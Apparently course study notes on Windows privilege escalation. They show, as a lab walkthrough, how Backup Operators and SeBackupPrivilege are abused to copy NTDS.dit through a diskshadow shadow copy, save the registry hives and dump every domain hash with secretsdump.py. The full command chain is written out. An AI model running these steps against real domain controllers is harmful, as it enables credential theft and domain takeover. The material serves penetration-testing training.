# Windows Built-in Groups — Backup Operators & SeBackupPrivilege

## ID
703

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 10 — Windows Built-in Groups (Backup Operators)

## Description
Abuse Backup Operators group membership and SeBackupPrivilege to read any file on the system, extract NTDS.dit from a Domain Controller via diskshadow, and dump all domain credentials offline.

## Tags
backup-operators, sebackupprivilege, ntds.dit, diskshadow, secretsdump, windows

## Commands
- `Import-Module .\SeBackupPrivilegeUtils.dll`
- `Import-Module .\SeBackupPrivilegeCmdLets.dll`
- `Set-SeBackupPrivilege`
- `Copy-FileSeBackupPrivilege '<SOURCE>' '<DEST>'`
- `diskshadow.exe`
- `robocopy /B <SOURCE_DIR> <DEST_DIR> <FILENAME>`
- `reg save HKLM\SYSTEM SYSTEM.SAV`
- `reg save HKLM\SAM SAM.SAV`
- `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`

## What This Section Covers
Membership in the Backup Operators group grants SeBackupPrivilege and SeRestorePrivilege. SeBackupPrivilege allows traversing and reading any file/folder by using the FILE_FLAG_BACKUP_SEMANTICS flag, bypassing normal ACLs. On a Domain Controller, this can be chained with diskshadow to create a shadow copy of the C: drive, extract NTDS.dit, and dump all domain hashes offline.

## Methodology
1. RDP in with the backup service account and open an **elevated** PowerShell.
2. Import `SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll`.
3. Run `Set-SeBackupPrivilege` to enable the privilege, confirm with `Get-SeBackupPrivilege`.
4. Use `Copy-FileSeBackupPrivilege` to copy the target file to a writable location.
5. (On a DC) Use `diskshadow.exe` to create a shadow copy and expose it as a new drive letter, then copy `NTDS\ntds.dit` from the shadow.
6. Export `HKLM\SYSTEM` and `HKLM\SAM` with `reg save`.
7. Exfil `ntds.dit` + `SYSTEM` to attack box and run `secretsdump.py` or use `DSInternals` PowerShell module to extract hashes.

## Multi-step Workflow — Read a Protected File
```
# Elevated PowerShell
Import-Module C:\Tools\SeBackupPrivilegeUtils.dll
Import-Module C:\Tools\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege       # confirm Enabled

Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' C:\Tools\flag.txt
cat C:\Tools\flag.txt
```

## Multi-step Workflow — Extract NTDS.dit from a DC
```
# 1. Create shadow copy
diskshadow.exe
  set verbose on
  set metadata C:\Windows\Temp\meta.cab
  set context clientaccessible
  set context persistent
  begin backup
  add volume C: alias cdrive
  create
  expose %cdrive% E:
  end backup
  exit

# 2. Copy NTDS.dit from shadow
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# Alternative: robocopy in backup mode
robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit

# 3. Export registry hives
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
reg save HKLM\SAM C:\Tools\SAM.SAV

# 4. On attack box — extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag at `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt` | (submit from your shell) | Copy-FileSeBackupPrivilege → cat |

## Key Takeaways
- Regular `copy` / `cat` / `type` will NOT work on protected files — you must use `Copy-FileSeBackupPrivilege` or `robocopy /B` which set the backup semantics flag.
- Backup Operators can log in locally to Domain Controllers — making NTDS.dit extraction a direct path to full domain compromise.
- `diskshadow` creates a volume shadow copy so you can access the locked NTDS.dit — the live file is always in use by AD.
- Two offline extraction options: `secretsdump.py` (Impacket, on attack box) or `DSInternals` PowerShell module (on target).
- `robocopy /B` is a built-in alternative to `Copy-FileSeBackupPrivilege` — no extra DLLs needed.
- If there's an explicit **deny** ACE for your user/group on the file, SeBackupPrivilege will NOT bypass it.

## Gotchas
- Must run from an **elevated** prompt — UAC blocks the privilege otherwise, even if assigned.
- The DLL modules (`SeBackupPrivilegeUtils.dll` and `SeBackupPrivilegeCmdLets.dll`) must be imported before `Set-SeBackupPrivilege` is available.
- On the DC, `diskshadow` commands must be run interactively or via a script file — they won't work piped inline.
- Don't forget to export SYSTEM hive alongside NTDS.dit — `secretsdump.py` needs the boot key from SYSTEM to decrypt hashes.
